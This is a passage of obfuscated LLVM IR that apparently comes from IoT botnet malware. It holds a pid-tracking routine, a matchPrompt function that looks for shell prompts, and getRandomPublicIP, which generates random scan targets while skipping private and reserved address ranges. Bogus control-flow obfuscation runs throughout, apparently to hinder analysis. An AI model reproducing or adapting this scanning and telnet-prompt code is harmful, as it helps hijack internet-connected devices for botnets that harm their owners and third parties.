  br i1 %42, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %34
  %43 = load i32, i32* %4, align 4
  %44 = zext i32 %43 to i64
  %45 = load i64, i64* @numpids, align 8
  %46 = sub i64 %45, 1
  %47 = icmp ult i64 %44, %46
  %48 = load i32, i32* @x.51
  %49 = load i32, i32* @y.52
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBBpart232, label %originalBB17alteredBB

originalBBpart232:                                ; preds = %originalBB17
  br i1 %47, label %56, label %85

; <label>:56:                                     ; preds = %originalBBpart232
  %57 = load i32, i32* @x.51
  %58 = load i32, i32* @y.52
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %56
  %65 = load i32*, i32** @pids, align 8
  %66 = load i32, i32* %4, align 4
  %67 = zext i32 %66 to i64
  %68 = getelementptr inbounds i32, i32* %65, i64 %67
  %69 = load i32, i32* %68, align 4
  %70 = load i32*, i32** %3, align 8
  %71 = load i32, i32* %4, align 4
  %72 = zext i32 %71 to i64
  %73 = getelementptr inbounds i32, i32* %70, i64 %72
  store i32 %69, i32* %73, align 4
  %74 = load i32, i32* @x.51
  %75 = load i32, i32* @y.52
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %82

; <label>:82:                                     ; preds = %originalBBpart236
  %83 = load i32, i32* %4, align 4
  %84 = add i32 %83, 1
  store i32 %84, i32* %4, align 4
  br label %34

; <label>:85:                                     ; preds = %originalBBpart232
  %86 = load i32, i32* %2, align 4
  %87 = load i32*, i32** %3, align 8
  %88 = load i64, i64* @numpids, align 8
  %89 = sub i64 %88, 1
  %90 = getelementptr inbounds i32, i32* %87, i64 %89
  store i32 %86, i32* %90, align 4
  %91 = load i32*, i32** @pids, align 8
  %92 = bitcast i32* %91 to i8*
  call void @free(i8* %92) #5
  %93 = load i32*, i32** %3, align 8
  store i32* %93, i32** @pids, align 8
  %94 = load i32, i32* %2, align 4
  store i32 %94, i32* %1, align 4
  br label %95

; <label>:95:                                     ; preds = %85, %8
  %96 = load i32, i32* %1, align 4
  ret i32 %96

originalBBalteredBB:                              ; preds = %originalBB, %10
  %97 = load i64, i64* @numpids, align 8
  %98 = add i64 %97, 1
  store i64 %98, i64* @numpids, align 8
  %99 = load i64, i64* @numpids, align 8
  %_ = sub i64 0, %99
  %gen = add i64 %_, 1
  %_1 = shl i64 %99, 1
  %_2 = shl i64 %99, 1
  %_3 = shl i64 %99, 1
  %_4 = sub i64 0, %99
  %gen5 = add i64 %_4, 1
  %_6 = sub i64 0, %99
  %gen7 = add i64 %_6, 1
  %100 = add i64 %99, 1
  %_8 = shl i64 %100, 4
  %_9 = sub i64 0, %100
  %gen10 = add i64 %_9, 4
  %_11 = sub i64 0, %100
  %gen12 = add i64 %_11, 4
  %_13 = sub i64 %100, 4
  %gen14 = mul i64 %_13, 4
  %_15 = sub i64 0, %100
  %gen16 = add i64 %_15, 4
  %101 = mul i64 %100, 4
  %102 = call noalias i8* @malloc(i64 %101) #5
  %103 = bitcast i8* %102 to i32*
  store i32* %103, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %originalBB

originalBB17alteredBB:                            ; preds = %originalBB17, %34
  %104 = load i32, i32* %4, align 4
  %105 = zext i32 %104 to i64
  %106 = load i64, i64* @numpids, align 8
  %_18 = sub i64 0, %106
  %gen19 = add i64 %_18, 1
  %_20 = sub i64 0, %106
  %gen21 = add i64 %_20, 1
  %_22 = shl i64 %106, 1
  %_23 = shl i64 %106, 1
  %_24 = sub i64 %106, 1
  %gen25 = mul i64 %_24, 1
  %_26 = shl i64 %106, 1
  %_27 = sub i64 %106, 1
  %gen28 = mul i64 %_27, 1
  %_29 = sub i64 %106, 1
  %gen30 = mul i64 %_29, 1
  %107 = sub i64 %106, 1
  %108 = icmp ult i64 %105, %107
  br label %originalBB17

originalBB34alteredBB:                            ; preds = %originalBB34, %56
  %109 = load i32*, i32** @pids, align 8
  %110 = load i32, i32* %4, align 4
  %111 = zext i32 %110 to i64
  %112 = getelementptr inbounds i32, i32* %109, i64 %111
  %113 = load i32, i32* %112, align 4
  %114 = load i32*, i32** %3, align 8
  %115 = load i32, i32* %4, align 4
  %116 = zext i32 %115 to i64
  %117 = getelementptr inbounds i32, i32* %114, i64 %116
  store i32 %113, i32* %117, align 4
  br label %originalBB34
}

; Function Attrs: nounwind
declare i32 @fork() #3

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = load i32, i32* @x.53
  %3 = load i32, i32* @y.54
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i8* %0, i8** %11, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.486, i32 0, i32 0), i8** %12, align 8
  %16 = load i8*, i8** %11, align 8
  %17 = call i64 @strlen(i8* %16) #9
  %18 = trunc i64 %17 to i32
  store i32 %18, i32* %13, align 4
  store i32 0, i32* %15, align 4
  store i32 0, i32* %14, align 4
  %19 = load i32, i32* @x.53
  %20 = load i32, i32* @y.54
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %27

; <label>:27:                                     ; preds = %129, %originalBBpart2
  %28 = load i32, i32* %14, align 4
  %29 = sext i32 %28 to i64
  %30 = load i8*, i8** %12, align 8
  %31 = call i64 @strlen(i8* %30) #9
  %32 = icmp ult i64 %29, %31
  br i1 %32, label %33, label %132

; <label>:33:                                     ; preds = %27
  br label %34

; <label>:34:                                     ; preds = %originalBBpart29, %33
  %35 = load i32, i32* %13, align 4
  %36 = load i32, i32* %15, align 4
  %37 = icmp sgt i32 %35, %36
  br i1 %37, label %38, label %88

; <label>:38:                                     ; preds = %34
  %39 = load i8*, i8** %11, align 8
  %40 = load i32, i32* %13, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds i8, i8* %39, i64 %41
  %43 = load i32, i32* %15, align 4
  %44 = sext i32 %43 to i64
  %45 = sub i64 0, %44
  %46 = getelementptr inbounds i8, i8* %42, i64 %45
  %47 = load i8, i8* %46, align 1
  %48 = sext i8 %47 to i32
  %49 = icmp eq i32 %48, 0
  br i1 %49, label %86, label %50

; <label>:50:                                     ; preds = %38
  %51 = load i8*, i8** %11, align 8
  %52 = load i32, i32* %13, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i32, i32* %15, align 4
  %56 = sext i32 %55 to i64
  %57 = sub i64 0, %56
  %58 = getelementptr inbounds i8, i8* %54, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp eq i32 %60, 32
  br i1 %61, label %86, label %62

; <label>:62:                                     ; preds = %50
  %63 = load i8*, i8** %11, align 8
  %64 = load i32, i32* %13, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i32, i32* %15, align 4
  %68 = sext i32 %67 to i64
  %69 = sub i64 0, %68
  %70 = getelementptr inbounds i8, i8* %66, i64 %69
  %71 = load i8, i8* %70, align 1
  %72 = sext i8 %71 to i32
  %73 = icmp eq i32 %72, 13
  br i1 %73, label %86, label %74

; <label>:74:                                     ; preds = %62
  %75 = load i8*, i8** %11, align 8
  %76 = load i32, i32* %13, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8, i8* %75, i64 %77
  %79 = load i32, i32* %15, align 4
  %80 = sext i32 %79 to i64
  %81 = sub i64 0, %80
  %82 = getelementptr inbounds i8, i8* %78, i64 %81
  %83 = load i8, i8* %82, align 1
  %84 = sext i8 %83 to i32
  %85 = icmp eq i32 %84, 10
  br label %86

; <label>:86:                                     ; preds = %74, %62, %50, %38
  %87 = phi i1 [ true, %62 ], [ true, %50 ], [ true, %38 ], [ %85, %74 ]
  br label %88

; <label>:88:                                     ; preds = %86, %34
  %89 = phi i1 [ false, %34 ], [ %87, %86 ]
  br i1 %89, label %90, label %109

; <label>:90:                                     ; preds = %88
  %91 = load i32, i32* @x.53
  %92 = load i32, i32* @y.54
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %90
  %99 = load i32, i32* %15, align 4
  %100 = add nsw i32 %99, 1
  store i32 %100, i32* %15, align 4
  %101 = load i32, i32* @x.53
  %102 = load i32, i32* @y.54
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart29, label %originalBB1alteredBB

originalBBpart29:                                 ; preds = %originalBB1
  br label %34

; <label>:109:                                    ; preds = %88
  %110 = load i8*, i8** %11, align 8
  %111 = load i32, i32* %13, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds i8, i8* %110, i64 %112
  %114 = load i32, i32* %15, align 4
  %115 = sext i32 %114 to i64
  %116 = sub i64 0, %115
  %117 = getelementptr inbounds i8, i8* %113, i64 %116
  %118 = load i8, i8* %117, align 1
  %119 = sext i8 %118 to i32
  %120 = load i8*, i8** %12, align 8
  %121 = load i32, i32* %14, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i8, i8* %120, i64 %122
  %124 = load i8, i8* %123, align 1
  %125 = sext i8 %124 to i32
  %126 = icmp eq i32 %119, %125
  br i1 %126, label %127, label %128

; <label>:127:                                    ; preds = %109
  store i32 1, i32* %10, align 4
  br label %133

; <label>:128:                                    ; preds = %109
  br label %129

; <label>:129:                                    ; preds = %128
  %130 = load i32, i32* %14, align 4
  %131 = add nsw i32 %130, 1
  store i32 %131, i32* %14, align 4
  br label %27

; <label>:132:                                    ; preds = %27
  store i32 0, i32* %10, align 4
  br label %133

; <label>:133:                                    ; preds = %132, %127
  %134 = load i32, i32* %10, align 4
  ret i32 %134

originalBBalteredBB:                              ; preds = %originalBB, %1
  %135 = alloca i32, align 4
  %136 = alloca i8*, align 8
  %137 = alloca i8*, align 8
  %138 = alloca i32, align 4
  %139 = alloca i32, align 4
  %140 = alloca i32, align 4
  store i8* %0, i8** %136, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.486, i32 0, i32 0), i8** %137, align 8
  %141 = load i8*, i8** %136, align 8
  %142 = call i64 @strlen(i8* %141) #9
  %143 = trunc i64 %142 to i32
  store i32 %143, i32* %138, align 4
  store i32 0, i32* %140, align 4
  store i32 0, i32* %139, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %90
  %144 = load i32, i32* %15, align 4
  %_ = sub i32 0, %144
  %gen = add i32 %_, 1
  %_2 = shl i32 %144, 1
  %_3 = sub i32 %144, 1
  %gen4 = mul i32 %_3, 1
  %_5 = shl i32 %144, 1
  %_6 = sub i32 %144, 1
  %gen7 = mul i32 %_6, 1
  %145 = add nsw i32 %144, 1
  store i32 %145, i32* %15, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %1 = load i32, i32* @x.55
  %2 = load i32, i32* @y.56
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca [16 x i8], align 16
  %10 = call i32 @rand() #5
  %11 = srem i32 %10, 223
  %12 = trunc i32 %11 to i8
  store i8 %12, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %13 = call i32 @rand() #5
  %14 = srem i32 %13, 255
  %15 = trunc i32 %14 to i8
  store i8 %15, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %16 = call i32 @rand() #5
  %17 = srem i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %19 = call i32 @rand() #5
  %20 = srem i32 %19, 255
  %21 = trunc i32 %20 to i8
  store i8 %21, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  %22 = load i32, i32* @x.55
  %23 = load i32, i32* @y.56
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %30

; <label>:30:                                     ; preds = %308, %originalBBpart2
  %31 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %32 = zext i8 %31 to i32
  %33 = icmp eq i32 %32, 0
  br i1 %33, label %306, label %34

; <label>:34:                                     ; preds = %30
  %35 = load i32, i32* @x.55
  %36 = load i32, i32* @y.56
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %34
  %43 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %44 = zext i8 %43 to i32
  %45 = icmp eq i32 %44, 10
  %46 = load i32, i32* @x.55
  %47 = load i32, i32* @y.56
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart226, label %originalBB24alteredBB

originalBBpart226:                                ; preds = %originalBB24
  br i1 %45, label %306, label %54

; <label>:54:                                     ; preds = %originalBBpart226
  %55 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %56 = zext i8 %55 to i32
  %57 = icmp eq i32 %56, 100
  br i1 %57, label %58, label %82

; <label>:58:                                     ; preds = %54
  %59 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %60 = zext i8 %59 to i32
  %61 = icmp sge i32 %60, 64
  br i1 %61, label %62, label %82

; <label>:62:                                     ; preds = %58
  %63 = load i32, i32* @x.55
  %64 = load i32, i32* @y.56
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBB28, label %originalBB28alteredBB

originalBB28:                                     ; preds = %originalBB28alteredBB, %62
  %71 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %72 = zext i8 %71 to i32
  %73 = icmp sle i32 %72, 127
  %74 = load i32, i32* @x.55
  %75 = load i32, i32* @y.56
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart230, label %originalBB28alteredBB

originalBBpart230:                                ; preds = %originalBB28
  br i1 %73, label %306, label %82

; <label>:82:                                     ; preds = %originalBBpart230, %58, %54
  %83 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %84 = zext i8 %83 to i32
  %85 = icmp eq i32 %84, 127
  br i1 %85, label %306, label %86

; <label>:86:                                     ; preds = %82
  %87 = load i32, i32* @x.55
  %88 = load i32, i32* @y.56
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB32, label %originalBB32alteredBB

originalBB32:                                     ; preds = %originalBB32alteredBB, %86
  %95 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %96 = zext i8 %95 to i32
  %97 = icmp eq i32 %96, 169
  %98 = load i32, i32* @x.55
  %99 = load i32, i32* @y.56
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart234, label %originalBB32alteredBB

originalBBpart234:                                ; preds = %originalBB32
  br i1 %97, label %106, label %110

; <label>:106:                                    ; preds = %originalBBpart234
  %107 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 254
  br i1 %109, label %306, label %110

; <label>:110:                                    ; preds = %106, %originalBBpart234
  %111 = load i32, i32* @x.55
  %112 = load i32, i32* @y.56
  %113 = sub i32 %111, 1
  %114 = mul i32 %111, %113
  %115 = urem i32 %114, 2
  %116 = icmp eq i32 %115, 0
  %117 = icmp slt i32 %112, 10
  %118 = or i1 %116, %117
  br i1 %118, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %110
  %119 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %120 = zext i8 %119 to i32
  %121 = icmp eq i32 %120, 172
  %122 = load i32, i32* @x.55
  %123 = load i32, i32* @y.56
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBBpart238, label %originalBB36alteredBB

originalBBpart238:                                ; preds = %originalBB36
  br i1 %121, label %130, label %138

; <label>:130:                                    ; preds = %originalBBpart238
  %131 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %132 = zext i8 %131 to i32
  %133 = icmp sle i32 %132, 16
  br i1 %133, label %134, label %138

; <label>:134:                                    ; preds = %130
  %135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %136 = zext i8 %135 to i32
  %137 = icmp sle i32 %136, 31
  br i1 %137, label %306, label %138

; <label>:138:                                    ; preds = %134, %130, %originalBBpart238
  %139 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %140 = zext i8 %139 to i32
  %141 = icmp eq i32 %140, 192
  br i1 %141, label %142, label %166

; <label>:142:                                    ; preds = %138
  %143 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %144 = zext i8 %143 to i32
  %145 = icmp eq i32 %144, 0
  br i1 %145, label %146, label %166

; <label>:146:                                    ; preds = %142
  %147 = load i32, i32* @x.55
  %148 = load i32, i32* @y.56
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %146
  %155 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %156 = zext i8 %155 to i32
  %157 = icmp eq i32 %156, 2
  %158 = load i32, i32* @x.55
  %159 = load i32, i32* @y.56
  %160 = sub i32 %158, 1
  %161 = mul i32 %158, %160
  %162 = urem i32 %161, 2
  %163 = icmp eq i32 %162, 0
  %164 = icmp slt i32 %159, 10
  %165 = or i1 %163, %164
  br i1 %165, label %originalBBpart242, label %originalBB40alteredBB

originalBBpart242:                                ; preds = %originalBB40
  br i1 %157, label %306, label %166

; <label>:166:                                    ; preds = %originalBBpart242, %142, %138
  %167 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %168 = zext i8 %167 to i32
  %169 = icmp eq i32 %168, 192
  br i1 %169, label %170, label %178

; <label>:170:                                    ; preds = %166
  %171 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %172 = zext i8 %171 to i32
  %173 = icmp eq i32 %172, 88
  br i1 %173, label %174, label %178

; <label>:174:                                    ; preds = %170
  %175 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %176 = zext i8 %175 to i32
  %177 = icmp eq i32 %176, 99
  br i1 %177, label %306, label %178

; <label>:178:                                    ; preds = %174, %170, %166
  %179 = load i32, i32* @x.55
  %180 = load i32, i32* @y.56
  %181 = sub i32 %179, 1
  %182 = mul i32 %179, %181
  %183 = urem i32 %182, 2
  %184 = icmp eq i32 %183, 0
  %185 = icmp slt i32 %180, 10
  %186 = or i1 %184, %185
  br i1 %186, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %178
  %187 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %188 = zext i8 %187 to i32
  %189 = icmp eq i32 %188, 192
  %190 = load i32, i32* @x.55
  %191 = load i32, i32* @y.56
  %192 = sub i32 %190, 1
  %193 = mul i32 %190, %192
  %194 = urem i32 %193, 2
  %195 = icmp eq i32 %194, 0
  %196 = icmp slt i32 %191, 10
  %197 = or i1 %195, %196
  br i1 %197, label %originalBBpart246, label %originalBB44alteredBB

originalBBpart246:                                ; preds = %originalBB44
  br i1 %189, label %198, label %202

; <label>:198:                                    ; preds = %originalBBpart246
  %199 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %200 = zext i8 %199 to i32
  %201 = icmp eq i32 %200, 168
  br i1 %201, label %306, label %202

; <label>:202:                                    ; preds = %198, %originalBBpart246
  %203 = load i32, i32* @x.55
  %204 = load i32, i32* @y.56
  %205 = sub i32 %203, 1
  %206 = mul i32 %203, %205
  %207 = urem i32 %206, 2
  %208 = icmp eq i32 %207, 0
  %209 = icmp slt i32 %204, 10
  %210 = or i1 %208, %209
  br i1 %210, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %202
  %211 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %212 = zext i8 %211 to i32
  %213 = icmp eq i32 %212, 198
  %214 = load i32, i32* @x.55
  %215 = load i32, i32* @y.56
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBBpart250, label %originalBB48alteredBB

originalBBpart250:                                ; preds = %originalBB48
  br i1 %213, label %222, label %246

; <label>:222:                                    ; preds = %originalBBpart250
  %223 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %224 = zext i8 %223 to i32
  %225 = icmp eq i32 %224, 18
  br i1 %225, label %306, label %226

; <label>:226:                                    ; preds = %222
  %227 = load i32, i32* @x.55
  %228 = load i32, i32* @y.56
  %229 = sub i32 %227, 1
  %230 = mul i32 %227, %229
  %231 = urem i32 %230, 2
  %232 = icmp eq i32 %231, 0
  %233 = icmp slt i32 %228, 10
  %234 = or i1 %232, %233
  br i1 %234, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %226
  %235 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %236 = zext i8 %235 to i32
  %237 = icmp eq i32 %236, 19
  %238 = load i32, i32* @x.55
  %239 = load i32, i32* @y.56
  %240 = sub i32 %238, 1
  %241 = mul i32 %238, %240
  %242 = urem i32 %241, 2
  %243 = icmp eq i32 %242, 0
  %244 = icmp slt i32 %239, 10
  %245 = or i1 %243, %244
  br i1 %245, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  br i1 %237, label %306, label %246

; <label>:246:                                    ; preds = %originalBBpart254, %originalBBpart250
  %247 = load i32, i32* @x.55
  %248 = load i32, i32* @y.56
  %249 = sub i32 %247, 1
  %250 = mul i32 %247, %249
  %251 = urem i32 %250, 2
  %252 = icmp eq i32 %251, 0
  %253 = icmp slt i32 %248, 10
  %254 = or i1 %252, %253
  br i1 %254, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %246
  %255 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %256 = zext i8 %255 to i32
  %257 = icmp eq i32 %256, 198
  %258 = load i32, i32* @x.55
  %259 = load i32, i32* @y.56
  %260 = sub i32 %258, 1
  %261 = mul i32 %258, %260
  %262 = urem i32 %261, 2
  %263 = icmp eq i32 %262, 0
  %264 = icmp slt i32 %259, 10
  %265 = or i1 %263, %264
  br i1 %265, label %originalBBpart258, label %originalBB56alteredBB

originalBBpart258:                                ; preds = %originalBB56
  br i1 %257, label %266, label %274

; <label>:266:                                    ; preds = %originalBBpart258
  %267 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %268 = zext i8 %267 to i32
  %269 = icmp eq i32 %268, 51
  br i1 %269, label %270, label %274

; <label>:270:                                    ; preds = %266
  %271 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %272 = zext i8 %271 to i32
  %273 = icmp eq i32 %272, 100
  br i1 %273, label %306, label %274

; <label>:274:                                    ; preds = %270, %266, %originalBBpart258
  %275 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %276 = zext i8 %275 to i32
  %277 = icmp eq i32 %276, 203
  br i1 %277, label %278, label %286

; <label>:278:                                    ; preds = %274
  %279 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %280 = zext i8 %279 to i32
  %281 = icmp eq i32 %280, 0
  br i1 %281, label %282, label %286

; <label>:282:                                    ; preds = %278
  %283 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %284 = zext i8 %283 to i32
  %285 = icmp eq i32 %284, 113
  br i1 %285, label %306, label %286

; <label>:286:                                    ; preds = %282, %278, %274
  %287 = load i32, i32* @x.55
  %288 = load i32, i32* @y.56
  %289 = sub i32 %287, 1
  %290 = mul i32 %287, %289
  %291 = urem i32 %290, 2
  %292 = icmp eq i32 %291, 0
  %293 = icmp slt i32 %288, 10
  %294 = or i1 %292, %293
  br i1 %294, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %286
  %295 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %296 = zext i8 %295 to i32
  %297 = icmp sge i32 %296, 224
  %298 = load i32, i32* @x.55
  %299 = load i32, i32* @y.56
  %300 = sub i32 %298, 1
  %301 = mul i32 %298, %300
  %302 = urem i32 %301, 2
  %303 = icmp eq i32 %302, 0
  %304 = icmp slt i32 %299, 10
